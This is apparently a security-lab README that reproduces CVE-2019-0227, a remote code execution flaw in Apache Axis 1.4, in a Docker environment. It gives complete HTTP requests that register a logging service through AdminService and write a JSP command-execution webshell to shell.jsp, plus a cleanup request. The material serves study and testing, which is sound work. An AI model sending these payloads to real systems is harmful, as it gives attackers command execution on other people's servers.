apache-axis/CVE-2019-0227/README.md

# Apache Axis 1.4 Remote Code Execution (CVE-2019-0227)

[中文版本(Chinese version)](README.zh-cn.md)

Apache Axis is an open-source SOAP-based web services framework written in Java. When `enableRemoteAdmin` is set to `true`, the `AdminService` interface can be accessed remotely. An attacker can use this interface to register an arbitrary Axis service and attach Axis's built-in `LogHandler`, which writes incoming SOAP messages to a configured file path. By writing to the web root and then invoking the registered service with JSP code in the request body, the attacker can create a webshell and achieve remote code execution. All Apache Axis 1.x releases are affected; no patched version of the 1.x branch exists.

CVE-2019-0227 can also be chained with the limited SSRF behavior in `StockQuoteService.jws` to reach `AdminService`, but this environment demonstrates the more direct risk when remote administration is explicitly enabled.

References:

- <https://nvd.nist.gov/vuln/detail/CVE-2019-0227>
- <https://rhinosecuritylabs.com/application-security/cve-2019-0227-expired-domain-rce-apache-axis/>
- <https://www.cnblogs.com/0x28/p/14380450.html>

## Environment Setup

Execute the following command to start Apache Axis 1.4:

```
docker compose up -d
```

`enableRemoteAdmin` is set to `true`, so `AdminService` can be invoked directly from outside the container.

After the containers start, wait approximately 20 seconds for Tomcat to initialise, then confirm the service is up:

```
curl -s http://your-ip:8080/axis/
```

## Vulnerability Reproduction

First, create a service through `AdminService`. The following WSDD registers `RandomService` and configures `LogHandler` to write incoming SOAP content to `webapps/axis/shell.jsp`:

```http
POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns1:deployment
  xmlns="http://xml.apache.org/axis/wsdd/"
  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
  xmlns:ns1="http://xml.apache.org/axis/wsdd/">
  <ns1:service name="RandomService" provider="java:RPC">
    <requestFlow>
      <handler type="RandomLog"/>
    </requestFlow>
    <ns1:parameter name="className" value="java.util.Random"/>
    <ns1:parameter name="allowedMethods" value="*"/>
  </ns1:service>
  <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >
    <parameter name="LogHandler.fileName" value="webapps/axis/shell.jsp" />
    <parameter name="LogHandler.writeToConsole" value="false" />
  </handler>
</ns1:deployment>
  </soapenv:Body>
</soapenv:Envelope>
```

![1](1.png)

Then, call the newly registered service and place JSP code in the SOAP body. `LogHandler` writes the request content into `shell.jsp` under the Axis web directory:

```http
POST /axis/services/RandomService HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0><![CDATA[
<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
]]>
            </api:in0>
        </api:main>
  </soapenv:Body>
</soapenv:Envelope>
```

![2](2.png)

Finally, visit `view-source:http://your-ip:8080/axis/shell.jsp?c=id` in the browser. The JSP code is executed and the command output is returned in the page source.

![3](3.png)

After reproduction, undeploy the test service:

```http
POST /axis/services/AdminService HTTP/1.1
Host: your-ip:8080
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <undeployment xmlns="http://xml.apache.org/axis/wsdd/">
      <service name="RandomService"/>
      <handler name="RandomLog"/>
    </undeployment>
  </soapenv:Body>
</soapenv:Envelope>
```
